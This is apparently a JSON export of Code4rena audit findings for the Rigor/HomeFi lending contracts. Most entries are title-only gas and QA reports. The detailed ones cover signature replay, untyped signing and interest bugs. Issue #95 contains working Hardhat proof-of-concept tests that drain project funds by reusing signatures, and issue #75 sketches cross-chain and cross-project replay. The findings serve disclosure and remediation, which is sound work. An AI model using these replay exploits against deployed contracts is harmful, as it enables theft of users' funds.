[{"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/176", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/175", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/174", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "No checks for ongoing dispute before some Ciritical Actions", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/171", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "valid"], "target": "2022-08-rigor-findings", "body": "No checks for ongoing dispute before some Ciritical Actions"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/170", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/169", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/167", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/166", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Builder can call `Community.escrow` again to reduce debt further using same signatures", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/161", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L509   # Vulnerability details  ## Impact  Since there is no nonce in the data decoded at the beginning of function `escrow`, a builder can call the function multiple times reducing their debt as much as they wish.  ## Proof of Concept  - A builder has a debt of $50,000 - A lender, a builder, and an escrow agent all ~~enter a bar~~ sign a message that will reduce the debt of the builder by $5,000, upon receipt of physical cash. - Function `escrow` is called and debt is reduced to $45,000. - The builder, using the same `_data` and `_signature` then calls `escrow` a further 9 times reducing their debt to zero.  ## Recommended Mitigation Steps  1. Similar to function `publishProject`, add a new field into the [ProjectDetails](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/interfaces/ICommunity.sol#L19-L32) struct called `escrowNonce`.  2. Modify function `escrow` to check this nonce and update it after the debt has been reduced.  See the diff below for full changes.  ```diff diff --git a/contracts/Community.sol b/contracts/Community.sol index 1585670..b834d0e 100644 --- a/contracts/Community.sol +++ b/contracts/Community.sol @@ -15,7 +15,7 @@ import {SignatureDecoder} from \"./libraries/SignatureDecoder.sol\";   /**   * @title Community Contract for HomeFi v2.5.0 - +   * @notice Module for coordinating lending groups on HomeFi protocol   */  contract Community is @@ -520,10 +520,11 @@ contract Community is              address _agent,              address _project,              uint256 _repayAmount, +            uint256 _escrowNonce,              bytes memory _details          ) = abi.decode(                  _data, -                (uint256, address, address, address, address, uint256, bytes) +                (uint256, address, address, address, address, uint256, uint256, bytes)              );           // Compute hash from bytes @@ -540,6 +541,12 @@ contract Community is              _lender == _communities[_communityID].owner,              \"Community::!Owner\"          ); +        ProjectDetails storage _communityProject = +          _communities[_communityID].projectDetails[_project]; +        require( +            _escrowNonce == _communityProject.escrowNonce, +            \"Community::invalid escrowNonce\" +        );           // check signatures          checkSignatureValidity(_lender, _hash, _signature, 0); // must be lender @@ -548,6 +555,7 @@ contract Community is           // Internal call to reduce debt          _reduceDebt(_communityID, _project, _repayAmount, _details); +        _communityProject.escrowNonce = _communityProject.escrowNonce + 1;          emit DebtReducedByEscrow(_agent);      }  diff --git a/contracts/interfaces/ICommunity.sol b/contracts/interfaces/ICommunity.sol index c45bbf0..652f51c 100644 --- a/contracts/interfaces/ICommunity.sol +++ b/contracts/interfaces/ICommunity.sol @@ -29,6 +29,7 @@ interface ICommunity {          uint256 lentAmount; // current principal lent to project (needs to be repaid by project's builder)          uint256 interest; // total accrued interest on `lentAmount`          uint256 lastTimestamp; // timestamp when last lending / repayment was made +        uint256 escrowNonce; // signing nonce to use when reducing debt by escrow      } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/157", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/156", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/154", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/152", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/151", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/150", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/149", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/148", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/147", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/146", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/145", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/144", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/143", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/129", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/123", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Hash for Project is not controlled - projects with the same hash are possible, and NFTs with the same URI", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/120", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "valid"], "target": "2022-08-rigor-findings", "body": "Hash for Project is not controlled - projects with the same hash are possible, and NFTs with the same URI"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/118", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/112", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/111", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/110", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/109", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/104", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "no use of safeMint() as safe guard for users", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/102", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "no use of safeMint() as safe guard for users"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/101", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/99", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/98", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/97", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Project funds can be drained by reusing signatures, in some cases", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/95", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L490 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330-L359 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L153-L164   # Vulnerability details   This attack path is the results of signatures reusing in 2 functions - `changeOrder()` and `setComplete()`, and a missing modifier at `Tasks.unApprove()` library function.  ## Impact  ### Draining the project from funds  Current or previous subcontractor of a task can drain the project out of its funds by running `setComplete()` multiple times.  This can be exploited in 3 scenarios: * The price of a task was changed to a price higher than available funds (i.e. `totalLent - _totalAllocated`, and therefore gets unapproved), and than changed back to the original price (or any price that's not higher than available funds) * The subcontractor for a task was changed via `changeOrder` and then changed back to the original subcontractor      * e.g. - Bob was the original SC, it was changed to Alice, and then back to Bob * Similar to the case above, but even if the current SC is different from the original SC - it can still work if the current and previous SCs are teaming up to run the attack      * e.g. Bob was the original SC, it was changed to Alice, and changed again to Eve. And now Alice and Eve are teaming up to drain funds from the project  After `setComplete()` ran once by the legitimate users (i.e. signed by contractor, SC and builder), the attackers can now run it multiple times: * Reuse signatures to run `changeOrder()` - changing SC or setting the price to higher than available funds     * The only signer that might change is the subcontractor, he's either teaming up with the attacker (scenario #3) or he was the SC when it was first called (scenario #2) * In case of price change:     * change it back to the original price via `changeOrder()`, reusing signatures     * Run `allocateFunds()` to mark it as funded again * SC runs `acceptInvite()` to mark task as active * Run `setComplete()` reusing signatures     * If SC has changed - replace his signature with the current one (current SC should be one of the attackers) * Repeat till the project runs out of funds  ### Changing tasks costs/subcontractor by external users This can also be used by external users (you don't need to be builder/GC/SC in order to run `changeOrder()`) to troll the system (This still requires the task to be changed at least twice, otherwise re-running `changeOrder()` with the same data would have no effect).  * Changing the task cost up or down, getting the SC paid a different amount than intended (if it goes unnoticed, or front-run the `setComplete()` function) * Unapproving a task by setting a different SC or a price higher than available funds     * The legitimate users can change it back, but the attacker can change it again, both sides playing around till someone gets tired :)   ## Proof of Concept  Since the tests depend on each other, the PoC tests were created by adding them to the file `test/utils/projectTests.ts`, after the function `it('should be able to complete a task'` ( [Line 1143](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1143) ).  In the first test - a subcontractor is changed and then changed back. In the second scenario a price is changed to the new price (that is higher than the total available funds, and therefore is unapproved) and then back to its original price (it can actually be any price that is not higher than the available funds). In both cases I'm demonstrating how the project can be drained out of fund,   ```typescript    type DataType = {     types: string[];     values: (string | number)[];   };    it('PoC change SC', async () => {        const taskID = 1;     let taskDetails = await project.getTask(taskID);     const scBob = taskDetails.subcontractor;     const scAliceSigner = signers[4];     console.log({ scBob, alice: scAliceSigner.address });     const newCost = taskCost; // same as old     console.log(taskDetails);     // await (await project.inviteSC([taskID], [signers[2].address])).wait();      const changeToAliceData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, scAliceSigner.address, newCost, project.address],     };     const changeToAliceSignedData = await signData(changeToAliceData);      await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      const changeToBobData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, scBob, newCost, project.address],     };     const changeToBobSignedData = await signData(changeToBobData);      await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);      const bobSigner = getSignerByAddress(signers, scBob);     await (await project.connect(bobSigner).acceptInviteSC([taskID])).wait();      // for some reason if you don't do this you get 'Mock on the method is not initialized' error     await mockDAIContract.mock.transfer       .withArgs(scAliceSigner.address, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(scBob, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), taskCost / 1e3)       .returns(true);       const setCompleteData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     let setCompleteSignedData = await signData(setCompleteData);     let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);       // attack start     await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();      // the only thing that has changed is that alice became a subcontractor     // IRL Alice can simply take the old signatures and replace Bob's signature     // with her own signature     let aliceSetCompleteSignedData = await signData(setCompleteData);       tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);     await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();          tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);           async function signData(data: DataType) {       let contractor = await project.contractor();       let builder = await project.builder();       let taskDetails = await project.getTask(taskID);       let sc = taskDetails.subcontractor;       // console.log({ contractor, builder, sc })        let changeSignersAddress = [contractor, sc];       let contractorDelegated = await project.contractorDelegated();       if (!contractorDelegated) {         changeSignersAddress.unshift(builder);       }       changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);       const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));        // console.log({ changeSignersAddress })       return await multisig(data, dataSigners);     }      async function changeSC(encodedData: string, signature: string) {       const tx = await project.changeOrder(encodedData, signature);       tx.wait();       await expect(tx).to.emit(project, 'ChangeOrderSC');     }   });     it('PoC change cost', async () => {     const taskID = 1;     let taskDetails = await project.getTask(taskID);     const originalSC = taskDetails.subcontractor;     const originalCost = taskCost;      const veryHighNewCost = taskCost * 10;     console.log(taskDetails);     // await (await project.inviteSC([taskID], [signers[2].address])).wait();      const changeToNewData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, originalSC, veryHighNewCost, project.address],     };     const changeToNewSignedData = await signData(changeToNewData);      await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);      const changeBackToOldData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, originalSC, originalCost, project.address],     };     const changeBackToOldSignedData = await signData(changeBackToOldData);      await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);     taskDetails = await project.getTask(taskID);      await expect(taskDetails.cost).to.be.equal(originalCost);      const originalSCSigner = getSignerByAddress(signers, originalSC);     await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();      // for some reason if you don't do this you get 'Mock on the method is not initialized' error     await mockDAIContract.mock.transfer       .withArgs(originalSC, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), taskCost / 1e3)       .returns(true);       const setCompleteData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     let setCompleteSignedData = await signData(setCompleteData);     let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);       // attack start     await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);     await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);      await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();        tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);     await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);      await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();      tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);          async function signData(data: DataType) {       let contractor = await project.contractor();       let builder = await project.builder();       let taskDetails = await project.getTask(taskID);       let sc = taskDetails.subcontractor;       // console.log({ contractor, builder, sc })        let changeSignersAddress = [contractor, sc];       let contractorDelegated = await project.contractorDelegated();       if (!contractorDelegated) {         changeSignersAddress.unshift(builder);       }       changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);       const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));        // console.log({ changeSignersAddress })       return await multisig(data, dataSigners);     }      async function changeCost(encodedData: string, signature: string) {       const tx = await project.changeOrder(encodedData, signature);       tx.wait();       // await expect(tx).to.emit(project, 'ChangeOrderSC');     }   });  ```  ## Tools Used Hardhat  ## Recommended Mitigation Steps  * Use nonce to protect `setComplete()` and `changeOrder()` from signatures reuse * Add the `onlyActive()` modifier to `Tasks.unApprove()` * Consider limiting `allocateFunds()` for builder only (this is not necessary to resolve the bug, just for hardening security)"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/93", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Hash approval not possible when contractor == subcontractor", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/86", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L859   # Vulnerability details  ## Impact & Proof Of Concept When a contractor (let's say Bob) is also a subcontractor (which can be a valid scenario), it is not possible to use the hash approval feature for `checkSignatureTask`. The first call to `checkSignatureValidity` will already delete `approvedHashes[address(Bob)][_hash]`, the second call therefore fails.  Note that the same situation would also be possible for builder == contractor, or builder == subcontractor, although those situations are probably less likely to occur.  ## Recommended Mitigation Steps Delete the approval only when all checks are done."}, {"title": "changeOrder requires subcontractor signature when the subcontractor address is 0", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/85", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "valid"], "target": "2022-08-rigor-findings", "body": "changeOrder requires subcontractor signature when the subcontractor address is 0"}, {"title": "Wrong APR can be used when project is unpublished and published again ", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/83", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L267   # Vulnerability details  ## Impact When a project is unpublished from a community, it can still owe money to this community (on which it needs to pay interest according to the specified APR). However, when the project is later published again in this community, the APR can be overwritten and the overwritten APR is used for the calculation of the interest for the old project (when it was unpublished).  ## Proof Of Concept 1.) Project A is published in community I with an APR of 3%. The community lends 1,000,000 USD to the project. 2.) Project A is unpublished, the `lentAmount` is still 1,000,000 USD. 3.) During one year, no calls to `repayLender`, `reduceDebt`, or `escrow` happens, i.e. the interest is never added and the `lastTimestamp` not updated. 4.) After one year, the project is published again in the same community. Because the FED raised interest rates, it is specified that the APR should be 5% from now on. 5.) Another $1,000,000 is lent to the project by calling `lendToProject`. Now, `claimInterest` is called which calculates the interest of the last year for the first million. However, the function already uses the new APR of 5%, meaning the added interest is 50,000 USD instead of the correct 30,000 USD.   ## Recommended Mitigation Steps When publishing a project, if the `lentAmount` for the community is non-zero, calculate the interest before updating the APR."}, {"title": "Untyped data signing", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/75", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L175 https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L213 https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L530 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Disputes.sol#L91 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L142 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L167 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L235 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L286 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L346 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L402 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L499   # Vulnerability details  ## Impact & Proof Of Concepts In many places of the project (see affected code), untyped application data is directly hashed and signed. This is strongly disencouraged, as it enables different attacks (that each could be considered their own issue / vulnerability, but I submitted it as one, as they have all the same root cause):  1.) Signature reuse across different Rigor projects: While some signature contain the project address, not all do. For instance, `updateProjectHash` only contains a `_hash` and a `_nonce`. Therefore, we can have the following scenario: Bob is the owner of project A and signs / submit `updateProjectHash` with nonce 0 and some hash. Then, a project B that also has Bob as the owner is created. Attacker Charlie can simply take the `_data` and `_signature` that Bob previously submitted to project A and send it to project B. As this project will have a nonce of 0 (fresh created), it will accept it. `updateTaskHash` is also affected by this. 2.) Signature reuse across different chains: Because the chain ID is not included in the data, all signatures are also valid when the project is launched on a chain with another chain ID. For instance, let's say it is also launched on Polygon. An attacker can now use all of the Ethereum signatures there. Because the Polygon addresses of user's (and potentially contracts, when the nonces for creating are the same) are often identical, there can be situations where the payload is meaningful on both chains. 3.) Signature reuse across Rigor functions: Some functions accept and decode data / signatures that were intended for other functions. For instance, see this example of providing the data & signature that was intended for `inviteContractor` to `setComplete`: ```diff diff --git a/test/utils/projectTests.ts b/test/utils/projectTests.ts index ae9e202..752e01f 100644 --- a/test/utils/projectTests.ts +++ b/test/utils/projectTests.ts @@ -441,7 +441,7 @@ export const projectTests = async ({      }    });  -  it('should be able to invite contractor', async () => { +  it.only('should be able to invite contractor', async () => {      expect(await project.contractor()).to.equal(ethers.constants.AddressZero);      const data = {        types: ['address', 'address'], @@ -452,6 +452,7 @@ export const projectTests = async ({        signers[1],      ]);      const tx = await project.inviteContractor(encodedData, signature); +    const tx2 = await project.setComplete(encodedData, signature);      await expect(tx)        .to.emit(project, 'ContractorInvited')        .withArgs(signers[1].address); ``` While this reverts because there is no task that corresponds to the address that is signed there, this is not always the case. 4.) Signature reuse from different Ethereum projects & phishing Because the payload of these signatures is very generic (two addresses, a byte and two uints), there might be situations where a user has already signed data with the same format for a completely different Ethereum application. Furthermore, an attacker could set up a DApp that uses the same format and trick someone into signing the data. Even a very security-conscious owner that has audited the contract of this DApp (that does not have any vulnerabilities and is not malicious, it simply consumes signatures that happen to have the same format) might be willing to sign data for this DApp, as he does not anticipate that this puts his Rigor project in danger.  ## Recommended Mitigation Steps I strongly recommend to follow [EIP-712](https://eips.ethereum.org/EIPS/eip-712) and not implement your own standard / solution. While this also improves the user experience, this topic is very complex and not easy to get right, so it is recommended to use a battle-tested approach that people have thought in detail about. All of the mentioned attacks are not possible with EIP-712: 1.) There is always a domain separator that includes the contract address. 2.) The chain ID is included in the domain separator 3.) There is a type hash (of the function name / parameters) 4.) The domain separator does not allow reuse across different projects, phishing with an innocent DApp is no longer possible (it would be shown to the user that he is signing data for Rigor, which he would off course not do on a different site)"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/74", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/71", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/67", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/66", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Project.sol and Community.sol have no way to revoke a hash in approvedHashes", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/64", "labels": ["bug", "2 (Med Risk)", "sponsor disputed", "valid"], "target": "2022-08-rigor-findings", "body": "Project.sol and Community.sol have no way to revoke a hash in approvedHashes"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/62", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/55", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-08-rigor-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-08-rigor-findings", "body": "QA Report"}, {"title": "Lack of event emission after sensitive action ", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/49", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L92 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L113   # Vulnerability details  ## Impact The initialize function of the HomeFi contract does not emit the AdminReplaced event after setting the value of the  _msgSender() to be the admin.  Consider emitting events after sensitive changes occur to facilitate tracking and notify off-chain clients following the contracts\u2019 activity.  ## Proof of Concept  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L92 